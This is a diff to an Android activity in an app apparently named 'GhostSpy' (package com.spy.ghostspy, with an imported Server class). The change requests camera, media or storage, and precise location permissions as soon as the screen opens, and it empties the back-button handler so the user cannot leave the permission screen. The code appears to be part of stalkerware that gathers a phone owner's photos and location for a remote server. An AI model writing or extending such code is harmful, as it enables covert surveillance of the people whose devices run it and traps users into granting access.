@@ -18,6 +18,7 @@ import android.os.Handler;
 import android.provider.Settings;
 import android.util.Log;
 import android.view.View;
+import android.window.OnBackInvokedDispatcher;
 
 import com.spy.ghostspy.R;
 import com.spy.ghostspy.server.Server;
@@ -30,6 +31,7 @@ public class PermissionSetActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_permission_set);
+        setPermission();
     }
 
     @Override
@@ -49,7 +51,7 @@ public class PermissionSetActivity extends AppCompatActivity {
         if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             ActivityCompat.requestPermissions(this, new String[]{
                     Manifest.permission.CAMERA,
-                    Manifest.permission.RECORD_AUDIO,
+//                    Manifest.permission.RECORD_AUDIO,
                     Manifest.permission.READ_MEDIA_IMAGES,
                     Manifest.permission.ACCESS_COARSE_LOCATION,
                     Manifest.permission.ACCESS_FINE_LOCATION,
@@ -62,7 +64,7 @@ public class PermissionSetActivity extends AppCompatActivity {
         } else {
             ActivityCompat.requestPermissions(this, new String[]{
                     Manifest.permission.CAMERA,
-                    Manifest.permission.RECORD_AUDIO,
+//                    Manifest.permission.RECORD_AUDIO,
                     Manifest.permission.READ_EXTERNAL_STORAGE,
                     Manifest.permission.ACCESS_COARSE_LOCATION,
                     Manifest.permission.ACCESS_FINE_LOCATION,
@@ -89,6 +91,5 @@ public class PermissionSetActivity extends AppCompatActivity {
 
     @Override
     public void onBackPressed() {
-        super.onBackPressed();
     }
 }
